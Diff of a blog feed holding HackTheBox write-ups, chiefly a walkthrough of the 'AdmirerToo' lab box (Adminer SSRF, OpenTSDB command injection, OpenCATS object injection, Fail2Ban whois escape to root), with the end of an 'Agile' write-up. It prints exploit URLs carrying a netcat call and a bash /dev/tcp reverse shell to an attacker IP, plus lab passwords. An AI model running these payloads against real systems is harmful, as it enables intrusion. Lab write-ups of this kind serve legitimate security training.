+
+<p><img src="/assets/img/Pasted image 20230324131518.png" alt="" /></p>
+
+<p>This is very interesting since the file is executed as a script. Setting my <code class="language-plaintext highlighter-rouge">$EDITOR</code> variable to <code class="language-plaintext highlighter-rouge">vim /app/venv/bin/activate</code>;</p>
+
+<p><img src="/assets/img/Pasted image 20230324131854.png" alt="" /></p>
+
+<p>Strangely, it opened the file in read-only mode. I had to add <code class="language-plaintext highlighter-rouge">--</code> between <code class="language-plaintext highlighter-rouge">vim</code> and the target file before it worked;</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">EDITOR</span><span class="o">=</span><span class="s1">'vim -- /app/venv/bin/activate'</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="/assets/img/Pasted image 20230324132404.png" alt="" /></p>
+
+<p>Few seconds later, I got a shell;</p>
+
+<p><img src="/assets/img/Pasted image 20230324132547.png" alt="" /></p>
+
+<hr />
+<p><br /></p>
+
+<h3 id="summary">Summary</h3>
+<p><br /></p>
+
+<ul>
+  <li>Web app has open registration.
+    <ul>
+      <li>It is a web-based password manager.</li>
+      <li>Export feature found to be vulnerable to LFI.</li>
+      <li>Exploited it to generate Werkzeug console PIN, and gained RCE.</li>
+    </ul>
+  </li>
+  <li><code class="language-plaintext highlighter-rouge">www-data</code>;
+    <ul>
+      <li>Recovered creds of user <code class="language-plaintext highlighter-rouge">corum</code> from local MySQL using creds in <code class="language-plaintext highlighter-rouge">/app/config_prod.json</code>.</li>
+    </ul>
+  </li>
+  <li><code class="language-plaintext highlighter-rouge">corum</code>;
+    <ul>
+      <li>Got <code class="language-plaintext highlighter-rouge">user.txt</code></li>
+      <li>Setup an SSH tunnel to access <code class="language-plaintext highlighter-rouge">test.superpass.htb:5555</code>.</li>
+      <li>Bypassed LFI filter using local symlinks to dump <code class="language-plaintext highlighter-rouge">/app/config_test.json</code>.</li>
+      <li>Used it access local MySQL and found creds for <code class="language-plaintext highlighter-rouge">edwards</code>.</li>
+    </ul>
+  </li>
+  <li><code class="language-plaintext highlighter-rouge">edwards</code>;
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">sudoedit</code> perms to <code class="language-plaintext highlighter-rouge">/app/config_test.json</code> as user/group <code class="language-plaintext highlighter-rouge">dev_admin</code>.</li>
+      <li>Identified a cron task running <code class="language-plaintext highlighter-rouge">/app/test_and_update.sh</code> which uses a python virtual env.</li>
+      <li>Virtual env setup file is writable to group <code class="language-plaintext highlighter-rouge">dev_admin</code>.</li>
+      <li>Exploited it to inject a BASH reverse shell, and got a shell as <code class="language-plaintext highlighter-rouge">root</code>.</li>
+    </ul>
+  </li>
+</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="medium" /><category term="werkzeug" /><category term="werkzeug console" /><category term="lfi" /><category term="mysql" /><category term="tunneling" /><category term="sudoedit" /><category term="sudo" /><category term="virtualenv" /><category term="web" /><summary type="html"><![CDATA[Agile is a medium linux box by 0xdf featuring a simple web-based LFI that could be used to bypass PIN validation in the Werkzeug debug console. Once on the box, you’ll recover some creds from a MySQL database and gain access to a local user account. You’ll then be required to exploit a previously discovered vulnerability but this time using a local symlink to get through a filter, and then exploit sudoedit and a cron job that uses python’s virtualenv to gain code execution as root.]]></summary></entry><entry><title type="html">Payback - OdysseyCTF</title><link href="https://4g3nt47.github.io/posts/ctf/payback.html" rel="alternate" type="text/html" title="Payback - OdysseyCTF" /><published>2023-07-31T00:00:00+01:00</published><updated>2023-07-31T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/ctf/payback</id><content type="html" xml:base="https://4g3nt47.github.io/posts/ctf/payback.html"><![CDATA[<p><strong>Payback</strong> is a hard-rated box created by <a href="https://github.com/4g3nt47">me</a> for the <a href="https://ctftime.org/event/2029/">OdysseyCTF</a>. It starts with exploiting a <em>NoSQL injection</em> vulnerability in a custom application to bypass registration restrictions, and then a <em>mass assignment</em> vulnerability to escalate to a higher privilege. This exposes an administrative function that’s vulnerable to <em>LFI</em>, which can be used to gain a shell on the box. Once inside, a hidden application running locally can be accessed using a tunnel and a credential recovered from the history file of MongoDB CLI tool. The app is vulnerable to <em>SSTI</em>, and can be exploited to access another local user. Priv-esc to root is by exploiting a <em>race condition</em> in a custom binary that uses <em>libcurl</em> to download files (this part was removed in the instance used for the competition).</p>
 
 <p><br /></p>
 
@@ -3860,514 +4340,4 @@ Service detection performed. Please report any incorrect results at https://nmap
       <li>Used it to create a cron task by writing to <code class="language-plaintext highlighter-rouge">/etc/con.d</code> to gain code execution as root.</li>
     </ul>
   </li>
-</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="bruteforce" /><category term="filter bypass" /><category term="static analysis" /><category term="php" /><category term="authentication bypass" /><category term="enumeration" /><category term="sql injection" /><category term="arbitrary file upload" /><category term="git" /><category term="suid" /><category term="cron" /><summary type="html"><![CDATA[Timing is a very nice medium-rated linux box that involves a bit of static analysis on PHP files. Foothold involves quite a few steps that start with an LFI vulnerability to read source code of the application to identify a broken authentication logic, an SQL injection flaw to elevate to the website admin, and then an RCE via file upload. User access is through a password reuse, which you recover from a previous git commit. Privesc targets a custom SUID script that runs a Java program, which allows you to write arbitrary files in any directory you can enter.]]></summary></entry><entry><title type="html">AdmirerToo - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/admirertoo.html" rel="alternate" type="text/html" title="AdmirerToo - HackTheBox" /><published>2022-05-29T00:00:00+01:00</published><updated>2022-05-29T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/admirertoo</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/admirertoo.html"><![CDATA[<p><strong>AdmirerToo</strong> is a hard-rated linux box. It starts with an SSRF exploit on <em>Adminer</em> to access an instance of <em>OpenTSDB</em> on port <strong>4242</strong>, which is vulnerable to RCE. This will give you a shell on the box as <code class="language-plaintext highlighter-rouge">opentsdb</code>, which you can use to extract credentials from a configuration file and gain access to the account of <code class="language-plaintext highlighter-rouge">jennifer</code> due to password reuse. An instance of <em>OpenCATS</em> is running locally on port <strong>8080</strong>, which you can access by setting up an SSH tunnel. <em>OpenCATS</em> is running as the user <code class="language-plaintext highlighter-rouge">devel</code>, who has write permissions on the directory <code class="language-plaintext highlighter-rouge">/usr/local/etc</code>, and is vulnerable <em>object injection</em> that you can use to write files in the directory, and exploit the <em>Fail2Ban</em> service to gain code execution as <code class="language-plaintext highlighter-rouge">root</code>.</p>
-
-<p><br /></p>
-
-<h3 id="info">Info</h3>
-<p><br /></p>
-
-<p><img src="/assets/img/20220212113822.png" alt="" /></p>
-
-<p><img src="/assets/img/20220212113838.png" alt="" /></p>
-
-<p><br /></p>
-
-<hr />
-<h3 id="recon">Recon</h3>
-<p><br /></p>
-
-<h4 id="nmap">NMAP</h4>
-<p><br /></p>
-
-<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-</pre></td><td class="rouge-code"><pre># Nmap 7.70 scan initiated Sat Feb 12 11:41:17 2022 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.137
-Increasing send delay for 10.10.11.137 from 0 to 5 due to 192 out of 638 dropped probes since last increase.
-Nmap scan report for admirertoo.htb (10.10.11.137)
-Host is up (0.34s latency).
-Not shown: 997 closed ports
-PORT     STATE    SERVICE        VERSION
-22/tcp   open     ssh            OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
-| ssh-hostkey: 
-|   2048 99:33:47:e6:5f:1f:2e:fd:45:a4:ee:6b:78:fb:c0:e4 (RSA)
-|   256 4b:28:53:64:92:57:84:77:5f:8d:bf:af:d5:22:e1:10 (ECDSA)
-|_  256 71:ee:8e:e5:98:ab:08:43:3b:86:29:57:23:26:e9:10 (ED25519)
-80/tcp   open     http           Apache httpd 2.4.38 ((Debian))
-| http-methods: 
-|_  Supported Methods: GET HEAD POST OPTIONS
-|_http-server-header: Apache/2.4.38 (Debian)
-|_http-title: Admirer
-4242/tcp filtered vrml-multi-use
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Read data files from: /usr/bin/../share/nmap
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Sat Feb 12 11:42:38 2022 -- 1 IP address (1 host up) scanned in 80.99 seconds
-</pre></td></tr></tbody></table></code></pre></div></div>
-
-<p><br /></p>
-
-<h4 id="web">Web</h4>
-<p><br /></p>
-
-<p><img src="/assets/img/20220212114740.png" alt="" /></p>
-
-<p>This is a PHP site due to presence of <code class="language-plaintext highlighter-rouge">/index.php</code>. The chat bubble in the homepage sent a request to the index page, but the request does not seem to be processed by the server as there are no changes in response;</p>
-
-<p><img src="/assets/img/20220212115359.png" alt="" /></p>
-
-<p>Requesting a non-existing page leaked a possible domain;</p>
-
-<p><img src="/assets/img/20220212120040.png" alt="" /></p>
-
-<p>I updated my hosts file with it, and reload the page. Nothing changed.</p>
-
-<p>Fuzzing for subdomains with <code class="language-plaintext highlighter-rouge">ffuf</code>, I got a hit;</p>
-
-<p><img src="/assets/img/20220212120534.png" alt="" /></p>
-
-<p><br /></p>
-
-<h4 id="dbadmirer-galleryhtb">db.admirer-gallery.htb</h4>
-<p><br /></p>
-
-<p><img src="/assets/img/20220212120952.png" alt="" /></p>
-
-<p>Clicking the <em>enter</em> button, I was login to a database management service like <em>phpMyAdmin</em> as the user <strong>admirer_ro</strong>;</p>
-
-<p><img src="/assets/img/20220212121927.png" alt="" /></p>
-
-<p>I have access to the database <strong>gallery</strong>, but I can’t make any changes to it;</p>
-
-<p><img src="/assets/img/20220212122014.png" alt="" /></p>
-
-<p>Going to the <em>privileges</em> menu from the homepage, I was able to read the password hash of the <strong>admirer_ro</strong> user;</p>
-
-<p><img src="/assets/img/20220212123348.png" alt="" /></p>
-
-<p>The password hash could not be cracked using <code class="language-plaintext highlighter-rouge">john</code> and <code class="language-plaintext highlighter-rouge">rockyou.txt</code>, so I moved on.</p>
-
-<p>However, I did not enter any password to login to the service, so I looked through my traffic in burp, and found a password <code class="language-plaintext highlighter-rouge">1w4nn4b3adm1r3d2!</code>;</p>
-
-<p><img src="/assets/img/20220212123541.png" alt="" /></p>
-
-<p>Looking at the source code of the login page, I found even more useful info;</p>
-
-<p><img src="/assets/img/20220212124001.png" alt="" /></p>
-
-<p><br /></p>
-
-<hr />
-<h3 id="adminer">Adminer</h3>
-<p><br /></p>
-
-<blockquote>
-  <p>Adminer is a tool for managing content in MySQL databases. Adminer is distributed under Apache license in a form of a single PHP file. Its author is Jakub Vrána who started to develop this tool as a light-weight alternative to phpMyAdmin, in July 2007.</p>
-</blockquote>
-
-<p>The service has support for custom plugins, which are installed in the <code class="language-plaintext highlighter-rouge">/plugins</code> directory;</p>
-
-<p><img src="/assets/img/20220214094555.png" alt="" /></p>
-
-<p>My first attempt at exploiting this service is to get it to authenticate to my own MySQL server, which may let me read local files on the server running <em>adminer</em> into my own database. So I created a database named <code class="language-plaintext highlighter-rouge">admirer</code>, and add a user to it with the username <code class="language-plaintext highlighter-rouge">admirer_ro</code> and password <code class="language-plaintext highlighter-rouge">1w4nn4b3adm1r3d2!</code>.</p>
-
-<p>Using burp’s <em>intercept</em>, I passed all the relevant config to the server;</p>
-
-<p><img src="/assets/img/20220214083419.png" alt="" /></p>
-
-<p>This didn’t work, and the login page displayed an error message;</p>
-
-<p><img src="/assets/img/20220214083631.png" alt="" /></p>
-
-<p>So I repeat the process with a wrong password to see if I can get a different response. I did;</p>
-
-<p><img src="/assets/img/20220214083855.png" alt="" /></p>
-
-<p>This indicate the first login attempt was likely successful. So I fired up <em>Wireshark</em> to see what exactly is going on.</p>
-
-<p>As you can see from the following packets, the box did manage to successfully authenticate to my MySQL database;</p>
-
-<p><img src="/assets/img/20220214084810.png" alt="" /></p>
-
-<p>However, the client exited using the <code class="language-plaintext highlighter-rouge">quit</code> (the last highlighted packet) command after the authentication has been completed. I have no clue why this is happening, may be the service is doing some sort of validation?</p>
-
-<p>Another thing I saw while going through the packets is support for <code class="language-plaintext highlighter-rouge">LOAD DATA LOCAL</code> command by the client, which is a command I could use to read local files on the box should the server allow it;</p>
-
-<p><img src="/assets/img/20220214085622.png" alt="" /></p>
-
-<p>After the MySQL session was closed, my box made a HTTP request to the server, and was given a <strong>403 Forbidden</strong> response;</p>
-
-<p><img src="/assets/img/20220214090602.png" alt="" /></p>
-
-<p>My guess is this is somehow interfering with the web login. The cookies look very interesting, so I started studying them. The cookie <code class="language-plaintext highlighter-rouge">adminer_permanent</code> is a URL-encoded base64-string;</p>
-
-<p><img src="/assets/img/20220214091542.png" alt="" /></p>
-
-<p>The cookie contains the database host, database name, and database username. The cookies <code class="language-plaintext highlighter-rouge">adminer_key</code> and <code class="language-plaintext highlighter-rouge">adminer_sid</code> look interesting, but I have no idea what they are. So I decided to install <em>Adminer</em> locally on my box in hope of learning more about them.</p>
-
-<p>I installed <em>Adminer</em> in a docker container along with a MySQL server, then I configured another MySQL service on my main host. In both databases, I created a database named <code class="language-plaintext highlighter-rouge">admirer</code> and created a user for it named <code class="language-plaintext highlighter-rouge">admirer_ro</code> with the passwords set to <code class="language-plaintext highlighter-rouge">1w4nn4b3adm1r3d2!</code>. Interestingly, my approach worked locally, and I was able to get the <em>Adminer</em> service in my docker container to connect to the database on my main host. I have no clue why it’s not working on the box, so I just moved on.</p>
-
-<p>Searching for exploits for the version of adminer running, I found this at https://github.com/advisories/GHSA-x5r2-hj5c-8jx6;</p>
-
-<p><img src="/assets/img/20220214154948.png" alt="" /></p>
-
-<p>The version of Adminer running on the host is vulnerable to SSRF. The PoC is in a linked PDF. It links to a python script at https://gist.github.com/bpsizemore/227141941c5075d96a34e375c63ae3bd, which can be used to setup the redirect.</p>
-
-<p>SSRF flaws are mainly used to access internal resources, or resources we are not allowed to directly access. Going back to my initial port scan, NMAP reported port <strong>4242</strong> as <em>filtered</em>;</p>
-
-<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-</pre></td><td class="rouge-code"><pre>---[snip]---
-|_http-title: Admirer
-4242/tcp filtered vrml-multi-use
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
----[snip]---
-</pre></td></tr></tbody></table></code></pre></div></div>
-
-<p>So I setup the redirection script to redirect requests to my box on port <strong>80</strong> to the filtered service at http://127.0.0.1:4242. I then send a login request with the server set to my box and driver set to <em>elastic</em> (for Elasticsearch);</p>
-
-<p><img src="/assets/img/20220214161416.png" alt="" /></p>
-
-<p><img src="/assets/img/20220214161606.png" alt="" /></p>
-
-<p>This worked, and I got a response from the hidden service;</p>
-
-<p><img src="/assets/img/20220214161741.png" alt="" /></p>
-
-<p>It seems the service supports the HTTP protocol. The title <strong>OpenTSDB</strong> looks interesting, so I started googling it;</p>
-
-<blockquote>
-  <p><strong>OpenTSDB</strong> is <em>a distributed, scalable Time Series Database</em> (TSDB) written on top of HBase. OpenTSDB was written to address a common need: store, index and serve metrics collected from computer systems (network gear, operating systems, applications) at a large scale, and make this data easily accessible and graphable.</p>
-</blockquote>
-
-<p>Seaching for known exploits for this service, I found a <em>Command Injection</em> vulnerability at https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2020/CVE-2020-35476.yaml</p>
-
-<p>Using the PoC provided that runs a <code class="language-plaintext highlighter-rouge">wget</code> command, I got a long error message about a missing “metric”;</p>
-
-<p><img src="/assets/img/20220214164802.png" alt="" /></p>
-
-<p>Googling on what exactly a “metric” is in this service, I learned that;</p>
-
-<blockquote>
-  <p>In OpenTSDB, a metric is <strong>named with a string</strong>, like http. hits . To be able to store all the different values for all the places where this metric exists, you tag the data with one or more tags when you send them to the TSD. TSD stores the timestamp, the value, and the tags.</p>
-</blockquote>
-
-<p>There is a way to list available metrics using the query <code class="language-plaintext highlighter-rouge">/api/suggest?type=metrics</code>. Using it on the host returned one entry <code class="language-plaintext highlighter-rouge">http.stats.web.hits</code>;</p>
-
-<p><img src="/assets/img/20220214165423.png" alt="" /></p>
-
-<p>So I updated the exploit using this metric;</p>
-
-<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[33:system(%27nc%2010.10.16.53%20443%27)]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json
-</pre></td></tr></tbody></table></code></pre></div></div>
-
-<p>And bingo!!!</p>
-
-<p><img src="/assets/img/20220214170430.png" alt="" /></p>
-
-<p>I used this exploit to spawn a shell on the box as <strong>opentsdb</strong> user;</p>
-
-<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[33:system(%27%2Fbin%2Fbash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.53%2F443%200%3E%261%22%27)]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json
-</pre></td></tr></tbody></table></code></pre></div></div>
-
-<p><img src="/assets/img/20220215033044.png" alt="" /></p>
-
-<p><br /></p>
-
-<hr />
-<h3 id="user">User</h3>
-<p><br /></p>
-
-<p>Local user with the name <strong>jennifer</strong> exists. The user I am working as is not part of any groups. <code class="language-plaintext highlighter-rouge">linPEAS</code> found some creds;</p>
-
-<p><img src="/assets/img/20220215034950.png" alt="" /></p>
-
-<p>This creds were found in the file <code class="language-plaintext highlighter-rouge">/etc/opencats/config.php</code>. I was able to login to the local MySQL server using it;</p>
-
-<p><img src="/assets/img/20220215035343.png" alt="" /></p>
-
-<p>This user has access to only one database, which contains the below tables;</p>
-
-<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-</pre></td><td class="rouge-code"><pre>+--------------------------------------+
-| Tables_in_cats_dev                   |
-+--------------------------------------+
----[snip]---
-| site                                 |
-| sph_counter                          |
-| system                               |
-| tag                                  |
-| user                                 |
-| user_login                           |
-| word_verification                    |
-| xml_feed_submits                     |
-| xml_feeds                            |
-| zipcodes                             |
-+--------------------------------------+
-</pre></td></tr></tbody></table></code></pre></div></div>
-
-<p>The table <code class="language-plaintext highlighter-rouge">user</code> looks interesting, and was found to contain some hashes;</p>
-
-<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-9
-</pre></td><td class="rouge-code"><pre>MariaDB [cats_dev]&gt; select user_id, email, user_name, password from user;
-+---------+-------------------------+----------------+----------------------------------+
-| user_id | email                   | user_name      | password                         |
-+---------+-------------------------+----------------+----------------------------------+
-|       1 | admin@testdomain.com    | admin          | dfa2a420a4e48de6fe481c90e295fe97 |
-|    1250 | 0                       | cats@rootadmin | cantlogin                        |
-|    1251 | jennifer@admirertoo.htb | jennifer       | f59f297aa82171cc860d76c390ce7f3e |
-+---------+-------------------------+----------------+----------------------------------+
-3 rows in set (0.001 sec)
-</pre></td></tr></tbody></table></code></pre></div></div>
-
-<p>I was unable to crack any of the hashes using the <code class="language-plaintext highlighter-rouge">rockyou.txt</code> wordlist with <code class="language-plaintext highlighter-rouge">john</code>, so I moved on.</p>
-
-<p>The box doesn’t allow to me to list the processes of other users, only mine;</p>
-
-<p><img src="/assets/img/20220215091250.png" alt="" /></p>
-
-<p>Using <code class="language-plaintext highlighter-rouge">pspy</code> also didn’t help, so we are probably in a jailed environment.</p>
-
-<p>There are a few other ports listening;</p>
-
-<p><img src="/assets/img/20220215091442.png" alt="" /></p>
-
-<p>The service on port <strong>8080</strong> caught my attention. This is a port normally used by web proxies, so I tried to use it with <code class="language-plaintext highlighter-rouge">curl</code> to make a request, but it didn’t work;</p>
-
-<p><img src="/assets/img/20220215093108.png" alt="" /></p>
-
-<p>It keeps closing connections about one second after they were established, even without sending any data.</p>
-
-<p>Looking at the <code class="language-plaintext highlighter-rouge">/opt</code> directory, I saw 2 directories owned by the <code class="language-plaintext highlighter-rouge">root</code> user;</p>
-
-<p><img src="/assets/img/20220215093232.png" alt="" /></p>
-
-<p>A quick search in <code class="language-plaintext highlighter-rouge">searchsploit</code> showed 2 vulns for <em>OpenCATS</em>;</p>
-
-<p><img src="/assets/img/20220215093404.png" alt="" /></p>
-
-<p>This is a <em>free open-source applicant tracking system (ATS).</em>, with documentation at https://opencats-documentation.readthedocs.io/</p>
-
-<p>After further enumeration of the filesystem, the file <code class="language-plaintext highlighter-rouge">/var/www/adminer/plugins/data/server.php</code> was found to contain the configuration of the <em>one-click login</em> plugin installed in Adminer. The file contains a commented-out password, which turns out to be the password of <strong>jennifer</strong>. This was easier than I expected;</p>
-
-<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
-<span class="k">return</span> <span class="p">[</span>
-  <span class="s1">'localhost'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
-<span class="c1">//    'username' =&gt; 'admirer',</span>
-<span class="c1">//    'pass'     =&gt; 'bQ3u7^AxzcB7qAsxE3',</span>
-<span class="c1">// Read-only account for testing</span>
-    <span class="s1">'username'</span> <span class="o">=&gt;</span> <span class="s1">'admirer_ro'</span><span class="p">,</span>
-    <span class="s1">'pass'</span>     <span class="o">=&gt;</span> <span class="s1">'1w4nn4b3adm1r3d2!'</span><span class="p">,</span>
-    <span class="s1">'label'</span>    <span class="o">=&gt;</span> <span class="s1">'MySQL'</span><span class="p">,</span>
-    <span class="s1">'databases'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
-      <span class="s1">'admirer'</span> <span class="o">=&gt;</span> <span class="s1">'Admirer DB'</span><span class="p">,</span>
-    <span class="p">)</span>
-  <span class="p">),</span>
-<span class="p">];</span>
-</pre></td></tr></tbody></table></code></pre></div></div>
-
-<p>This password gave me access to the box over SSH as <strong>jennifer</strong>;</p>
-
-<p><img src="/assets/img/20220215094647.png" alt="" /></p>
-
-<p><br /></p>
-
-<hr />
-<h3 id="privesc">PrivEsc</h3>
-<p><br /></p>
-
-<p><strong>jennifer</strong> does not have <code class="language-plaintext highlighter-rouge">sudo</code> permissions on the box, and I still cannot list running processes belonging to other users.</p>
-
-<p>Looking for attack vectors, I noticed the modification date of <code class="language-plaintext highlighter-rouge">/usr/bin/pkexec</code> dates back to <strong>15 Jan 2019</strong>. This indicate it may be vulnerable to the <em>pwnkit</em> exploit. Searching for exploits, I found one at https://github.com/ly4k/PwnKit. Testing the exploit on the box, I was elevated to root immediately. This is way too easy for a <strong>hard</strong> box, so I contacted a staff through the HTB discord, and found out it is indeed unintended. So I switched back to <strong>jennifer</strong>, and started looking for the intended way.</p>
-
-<p>Since I now have access to the box over SSH, I can use it to setup tunnels to those local ports, and hopefully identify them using <code class="language-plaintext highlighter-rouge">nmap</code>. After setting up the tunnels, I performed a version scan on the ports;</p>
-
-<p><img src="/assets/img/20220215101505.png" alt="" /></p>
-
-<p>The service on port <strong>8080</strong> was now identified as <em>Apache httpd 2.4.38 ((Debian))</em>. Opening it up in my browser, I got a login page;</p>
-
-<p><img src="/assets/img/20220215101822.png" alt="" /></p>
-
-<p>Testing the credentials I have up to this point for an easy win, I was able to login using the username <code class="language-plaintext highlighter-rouge">jennifer</code> and password <code class="language-plaintext highlighter-rouge">bQ3u7^AxzcB7qAsxE3</code>;</p>
-
-<p><img src="/assets/img/20220215102211.png" alt="" /></p>
-
-<p>The footer showed the version of <strong>OpenCATS</strong> running is <strong>0.9.5.2</strong>. Notice that <em>jennifer</em> has read-only access to the service</p>
-
-<p><br /></p>
-
-<h4 id="opencats">OpenCATS</h4>
-<p><br /></p>
-
-<p>With the version of <strong>OpenCATS</strong> now known, I started looking for exploits. The article https://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html showed that the service is vulnerable to <em>arbitrary file write</em> due to unsafe PHP object deserialization.</p>
-
-<blockquote>
-  <p>OpenCATS is vulnerable to PHP Object injection, by leveraging this vulnerability, it is possible to conduct arbitrary file write and execute arbitrary code on a system.</p>
-</blockquote>
-
-<p>The request of interest is triggered after hitting any of the below links;</p>
-
-<p><img src="/assets/img/20220215110734.png" alt="" /></p>
-
-<p>This generate a GET request with the parameter <code class="language-plaintext highlighter-rouge">parametersactivity:ActivityDataGrid</code> containing the serialized PHP object;</p>
-
-<p><img src="/assets/img/20220215114134.png" alt="" /></p>
-
-<p>Following the article, I tried to write a file to the root of the web app at <code class="language-plaintext highlighter-rouge">/opt/opencats</code>, but got a <strong>500</strong> error response. This is probably because of permission issues as the web root is owned by the root user.</p>
-
-<p>So I tried to create a file in the globally writable directory <code class="language-plaintext highlighter-rouge">/dev/shm</code>, and it worked;</p>
-
-<p><img src="/assets/img/20220215161307.png" alt="" /></p>
-
-<p><img src="/assets/img/20220215161455.png" alt="" /></p>
-
-<p><img src="/assets/img/20220215161532.png" alt="" /></p>
-
-<p>The file is created as the user <strong>devel</strong>. The user <strong>devel</strong> does not have a login shell, and his home directory does not exist;</p>
-
-<p><img src="/assets/img/20220215161640.png" alt="" /></p>
-
-<p>So I begin to search the filesystem for files and directories this user owns, and found a few;</p>
-
-<p><img src="/assets/img/20220215114845.png" alt="" /></p>
-
-<p><strong>devel</strong> has write permissions on two key directories;</p>
-
-<p><img src="/assets/img/20220215161814.png" alt="" /></p>
-
-<p>Both directories are empty. The directory <code class="language-plaintext highlighter-rouge">/usr/local/etc</code> is used by some programs to store and load configuration files. So I started looking for any program I could exploit using this. Listing running services using <code class="language-plaintext highlighter-rouge">systemctl</code> showed that <em>Fail2Ban</em>, which is an IPS-like service that blocks suspicious IPs, is running on the host;</p>
-
-<p><img src="/assets/img/20220215170016.png" alt="" /></p>
-
-<p>Searching for known expoits for this service, I found an article explaining how it could be exploited at https://research.securitum.com/fail2ban-remote-code-execution/</p>
-
-<p>The article explains how data passed to the <code class="language-plaintext highlighter-rouge">mail</code> command without validation can lead to <em>arbitrary code execution</em> using the <code class="language-plaintext highlighter-rouge">~!</code> escape sequence. I was able to test this locally, and it worked. A shell command was executed in my default login shell;</p>
-
-<p><img src="/assets/img/20220215170817.png" alt="" /></p>
-
-<p>Reading further into the article, this paragraph was particularly interesting;</p>
-
-<p><img src="/assets/img/20220215171014.png" alt="" /></p>
-
-<p>When <em>Fail2Ban</em> bans an IP, it sends an email notification to a defined address. The email will contain the result of a <em>whois</em> lookup for the IP address. So if I could control this, I could add a command that will be executed in the result of the whois lookup.</p>
-
-<p>Testing this with a user account that does not have a default shell didn’t work;</p>
-
-<p><img src="/assets/img/20220215172244.png" alt="" /></p>
-
-<p>Changing the escape from <code class="language-plaintext highlighter-rouge">~!</code> to <code class="language-plaintext highlighter-rouge">~|</code> did the trick;</p>
-
-<p><img src="/assets/img/20220215172357.png" alt="" /></p>
-
-<p>Now all I needed to do is create a <em>whois</em> config that will direct all whois lookups to my machine on port <strong>43</strong>. To do this, I need to create a configuration file at <code class="language-plaintext highlighter-rouge">/usr/local/etc/whois.conf</code> that will be used by <code class="language-plaintext highlighter-rouge">whois</code>. I can use the deserialization exploit to do this, but the problem is other data is added to my payload;</p>
-
-<p><img src="/assets/img/20220215173720.png" alt="" /></p>
-
-<p>Note that only the highlighted text is my actual payload. After studying a bit on whois configuration files, I learned that the configurations have to be in <em>regular expression</em>. After lots of trials and errors, I was able to craft a valid <em>whois</em> config file to match my IP address using the payload <code class="language-plaintext highlighter-rouge">"}]|10.10.16.53 [10.10.16.53]</code>;</p>
-
-<p><img src="/assets/img/20220215181115.png" alt="" /></p>
-
-<p>As you can see above, I was able to get <code class="language-plaintext highlighter-rouge">whois</code> to query my own server. Now I have all I need to execute commands on the box.</p>
-
-<p>With the whois configuration file in place, I started a netcat listener on port <strong>43</strong> to send the payload as a whois response;</p>
-
-<p><img src="/assets/img/20220215183213.png" alt="" /></p>
-
-<p>Then I started another listener on port <strong>443</strong> to receive the above reverse shell. Now to trigger the exploit, I need to make <em>Fail2Ban</em>, which is running as root, to ban my IP. This will result in a whois request that will be replied to with my payload. To trigger this ban, I bruteforced the SSH login using <code class="language-plaintext highlighter-rouge">hydra</code>, which made <em>Fail2Ban</em> ban my IP. This resulted in a whois lookup to my box;</p>
-
-<p><img src="/assets/img/20220215183555.png" alt="" /></p>
-
